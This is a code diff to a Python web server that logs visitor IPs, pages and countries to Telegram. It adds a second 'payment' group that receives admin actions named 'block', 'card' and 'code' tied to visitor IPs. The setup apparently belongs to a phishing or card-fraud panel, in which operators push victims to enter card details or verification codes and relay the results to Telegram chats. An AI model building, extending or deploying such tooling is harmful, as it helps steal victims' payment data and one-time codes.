@@ -9,6 +9,7 @@ import sqlite3
 import traceback
 import json
 from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
+from config import PAYMENT_GROUP_ID
 import logging
 from functools import wraps
 
@@ -105,7 +106,7 @@ def log_function(func):
     return wrapper
 
 @log_function
-def send_telegram_log(page, link, ip, country="", extra_user_id=None):
+def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
     # Визначаємо країну за IP, якщо не передано
     if not country:
         try:
@@ -126,7 +127,12 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data_admin = {"chat_id": ADMIN_ID, "text": msg}
+    data_group = {"chat_id": GROUP_ID, "text": msg}
+    data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
     try:
+        if important:
+            requests.post(url, data=data_group, timeout=2)
+            requests.post(url, data=data_group2, timeout=2)
         requests.post(url, data=data_admin, timeout=2)
         if extra_user_id:
             data_user = {"chat_id": extra_user_id, "text": msg}
@@ -615,9 +621,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 data = json.loads(post_data)
                 action = data.get('action')
                 ip = data.get('ip')
-                # --- Тільки тут надсилаємо в групу ---
+                # --- Тільки тут надсилаємо в обидві групи ---
                 if action in ['block', 'card', 'code'] and ip:
-                    send_telegram_log(page=action, link='', ip=ip)  # Надсилаємо в групу і адміну
+                    send_telegram_log(page=action, link='', ip=ip, important=True)
                 if action == 'block' and ip:
                     BLACKLISTED_IPS.add(ip)
                     print(f'[admin_action] Blocked IP: {ip}')
